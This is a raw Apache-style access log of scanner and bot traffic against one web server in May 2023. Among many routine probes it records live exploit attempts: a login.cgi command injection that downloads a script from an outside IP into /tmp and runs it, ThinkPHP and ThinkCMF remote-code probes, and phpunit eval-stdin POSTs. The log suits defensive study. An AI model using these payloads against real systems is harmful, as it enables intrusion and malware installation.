3.138.111.203 - - [19/May/2023:10:08:33 -0400] "GET /.well-known/acme-challenge/KF72B58eF_rmJlr-ANpis7vctHKtKuYahVLat0VI454 HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
213.65.160.226 - - [28/May/2023:00:29:21 -0400] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:21 -0400] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:22 -0400] "GET /sql/php-myadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:22 -0400] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:22 -0400] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:22 -0400] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:22 -0400] "GET /admin/db/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:22 -0400] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:22 -0400] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:22 -0400] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:22 -0400] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:22 -0400] "GET /phpmyadmin2011/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:23 -0400] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
213.65.160.226 - - [28/May/2023:00:29:23 -0400] "GET /phpmy/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
83.97.73.89 - - [28/May/2023:00:37:58 -0400] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
69.167.12.16 - - [28/May/2023:00:53:25 -0400] "HEAD /wordpress HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.16 - - [28/May/2023:00:53:25 -0400] "HEAD / HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.16 - - [28/May/2023:00:53:26 -0400] "HEAD /wp HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.16 - - [28/May/2023:00:53:26 -0400] "HEAD /bc HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.16 - - [28/May/2023:00:53:26 -0400] "HEAD /bk HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.16 - - [28/May/2023:00:53:26 -0400] "HEAD /backup HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.16 - - [28/May/2023:00:53:27 -0400] "HEAD /old HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.16 - - [28/May/2023:00:53:27 -0400] "HEAD /new HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.16 - - [28/May/2023:00:53:27 -0400] "HEAD /main HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.16 - - [28/May/2023:00:53:27 -0400] "HEAD /home HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
178.54.47.70 - - [28/May/2023:00:59:31 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
74.82.47.5 - - [28/May/2023:01:07:04 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0"
74.82.47.5 - - [28/May/2023:01:09:29 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
74.82.47.5 - - [28/May/2023:01:10:48 -0400] "GET /geoserver/web/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0"
66.249.65.195 - - [28/May/2023:01:49:27 -0400] "GET /robots.txt HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.192 - - [28/May/2023:01:49:27 -0400] "GET /assets/img/general/notificaiton_5.jpg HTTP/1.1" 404 196 "-" "Googlebot-Image/1.0"
106.75.145.88 - - [28/May/2023:02:02:21 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.145.88 - - [28/May/2023:02:02:26 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.145.88 - - [28/May/2023:02:02:28 -0400] "GET /assets/js/plugins/jquery-3.6.0.min.js HTTP/1.1" 200 89501 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.145.88 - - [28/May/2023:02:02:35 -0400] "GET /assets/js/plugins/jquery.slick.min.js HTTP/1.1" 200 42664 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.145.88 - - [28/May/2023:02:02:40 -0400] "GET /global/config.js HTTP/1.1" 200 404 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.145.88 - - [28/May/2023:02:02:41 -0400] "GET /global/sign.js HTTP/1.1" 200 6392 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.145.88 - - [28/May/2023:02:02:43 -0400] "GET /global/filter.js HTTP/1.1" 200 3903 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
103.110.32.156 - - [28/May/2023:04:22:55 -0400] "GET / HTTP/1.1" 200 53859 "-" "Linux Gnu (cow)"
143.244.147.206 - - [28/May/2023:04:53:15 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
143.244.147.206 - - [28/May/2023:04:53:16 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
194.180.48.60 - - [28/May/2023:04:58:10 -0400] "GET / HTTP/1.0" 200 53859 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
139.162.90.133 - - [28/May/2023:05:07:58 -0400] "GET / HTTP/1.1" 200 53859 "http://www.openurls.com.cn/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:02 -0400] "GET /assets/css/plugins/fontawesome.min.css HTTP/1.1" 200 76487 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:03 -0400] "GET /assets/css/plugins/slick.css HTTP/1.1" 200 1767 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:03 -0400] "GET /assets/css/style.css HTTP/1.1" 200 155825 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:03 -0400] "GET /assets/css/plugins/bootstrap.min.css HTTP/1.1" 200 155637 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:03 -0400] "GET /assets/js/plugins/isotope.pkg.min.js HTTP/1.1" 200 35456 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:03 -0400] "GET /assets/js/plugins/jquery-3.6.0.min.js HTTP/1.1" 200 89501 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:04 -0400] "GET /assets/js/plugins/jquery.slick.min.js HTTP/1.1" 200 42664 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:04 -0400] "GET /assets/js/main.js HTTP/1.1" 200 16685 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:06 -0400] "GET /global/functions.js HTTP/1.1" 200 12046 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:06 -0400] "GET /global/config.js HTTP/1.1" 200 404 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:06 -0400] "GET /global/sign.js HTTP/1.1" 200 6392 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:06 -0400] "GET /global/dialog.js HTTP/1.1" 200 7476 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:07 -0400] "GET /global/filter.js HTTP/1.1" 200 3903 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:07 -0400] "GET /assets/img/general/notificaiton_3.jpeg HTTP/1.1" 200 340 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:07 -0400] "GET /assets/img/general/notificaiton_2.jpeg HTTP/1.1" 200 340 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:07 -0400] "GET /assets/img/general/notificaiton_5.jpeg HTTP/1.1" 200 340 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:07 -0400] "GET /assets/img/general/notificaiton_1.jpeg HTTP/1.1" 200 394 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:07 -0400] "GET /assets/img/general/notificaiton_4.jpeg HTTP/1.1" 200 340 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:08 -0400] "GET /assets/img/avatar/avatar_3.png HTTP/1.1" 200 520 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:08 -0400] "GET /assets/img/avatar/avatar_1.png HTTP/1.1" 200 520 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:49 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "http://23.92.219.236/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
139.162.90.133 - - [28/May/2023:05:08:49 -0400] "GET /assets/fonts/fa-brands-400.woff2 HTTP/1.1" 200 78460 "http://23.92.219.236/assets/css/plugins/fontawesome.min.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
35.203.210.106 - - [28/May/2023:05:21:23 -0400] "GET / HTTP/1.1" 200 53859 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
179.43.177.244 - - [28/May/2023:05:43:33 -0400] "GET / HTTP/1.1" 200 53859 "-" "Hello World"
87.236.176.236 - - [28/May/2023:06:28:55 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
83.97.73.89 - - [28/May/2023:06:29:08 -0400] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.142.125.225 - - [28/May/2023:06:30:21 -0400] "GET / HTTP/1.1" 200 53859 "-" "-"
162.142.125.225 - - [28/May/2023:06:30:21 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.225 - - [28/May/2023:06:30:22 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
138.197.112.69 - - [28/May/2023:06:46:13 -0400] "GET /ab2g HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
138.197.112.69 - - [28/May/2023:06:46:14 -0400] "GET /ab2h HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
138.197.112.69 - - [28/May/2023:06:46:14 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.112.69 - - [28/May/2023:06:46:15 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
138.197.112.69 - - [28/May/2023:06:46:15 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
138.197.112.69 - - [28/May/2023:06:46:15 -0400] "GET /t4 HTTP/1.1" 404 196 "-" "Mozilla/5.0"
138.197.112.69 - - [28/May/2023:06:46:15 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
31.220.90.131 - - [28/May/2023:07:01:20 -0400] "GET /000000000000.cfg HTTP/1.1" 404 196 "-" "FileTransport PolycomVVX-VVX_410-UA/5.4.5.8726"
83.97.73.89 - - [28/May/2023:07:20:30 -0400] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.205.213.108 - - [28/May/2023:07:43:56 -0400] "GET /login.cgi?cli=aa%20aa%27;wget%20http://109.205.213.7/8UsA.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1" 400 226 "-" "r00ts3c-owned-you"
64.62.197.154 - - [28/May/2023:07:50:42 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
64.62.197.159 - - [28/May/2023:07:56:17 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
64.62.197.152 - - [28/May/2023:07:57:26 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
64.62.197.156 - - [28/May/2023:07:59:09 -0400] "GET /geoserver/web/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
64.62.197.166 - - [28/May/2023:07:59:33 -0400] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
138.68.170.64 - - [28/May/2023:08:00:45 -0400] "" 400 226 "-" "-"
192.241.195.57 - - [28/May/2023:08:30:04 -0400] "GET /portal/redlion HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
179.43.177.244 - - [28/May/2023:08:53:22 -0400] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://23.92.219.236:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
83.97.73.89 - - [28/May/2023:08:55:58 -0400] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
50.21.182.102 - - [28/May/2023:08:57:06 -0400] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
50.21.182.102 - - [28/May/2023:08:57:06 -0400] "GET /wp-content/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
83.97.73.89 - - [28/May/2023:09:14:43 -0400] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
37.247.104.30 - - [28/May/2023:09:30:45 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
192.241.198.9 - - [28/May/2023:10:12:11 -0400] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
95.214.27.131 - - [28/May/2023:10:13:18 -0400] "HEAD / HTTP/1.1" 200 - "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
95.214.27.131 - - [28/May/2023:10:13:19 -0400] "GET /info.php HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
95.214.27.131 - - [28/May/2023:10:13:20 -0400] "GET /phpinfo.php HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
95.214.27.131 - - [28/May/2023:10:13:22 -0400] "GET /_profiler/phpinfo HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
95.214.27.131 - - [28/May/2023:10:13:23 -0400] "GET /debug/default/view?panel=config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.130 - - [28/May/2023:10:16:29 -0400] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.56.29.130 - - [28/May/2023:10:16:30 -0400] "POST / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.56.29.130 - - [28/May/2023:10:16:31 -0400] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.56.29.130 - - [28/May/2023:10:16:31 -0400] "POST / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
107.170.231.9 - - [28/May/2023:10:17:28 -0400] "GET /actuator/health HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
83.97.73.89 - - [28/May/2023:10:27:25 -0400] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.89 - - [28/May/2023:10:38:19 -0400] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.199.119.35 - - [28/May/2023:10:48:04 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 zgrab/0.x"
162.243.134.59 - - [28/May/2023:10:53:18 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
141.98.11.41 - - [28/May/2023:10:55:45 -0400] "GET / HTTP/1.1" 200 53859 "-" "-"
103.110.32.156 - - [28/May/2023:11:05:57 -0400] "GET / HTTP/1.1" 200 53859 "-" "Linux Gnu (cow)"
35.203.210.225 - - [28/May/2023:11:21:45 -0400] "GET / HTTP/1.1" 200 53859 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
83.97.73.89 - - [28/May/2023:11:40:00 -0400] "GET /console/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.239.13 - - [28/May/2023:11:51:25 -0400] "GET /hudson HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
45.227.254.55 - - [28/May/2023:11:56:34 -0400] "\x03" 400 226 "-" "-"
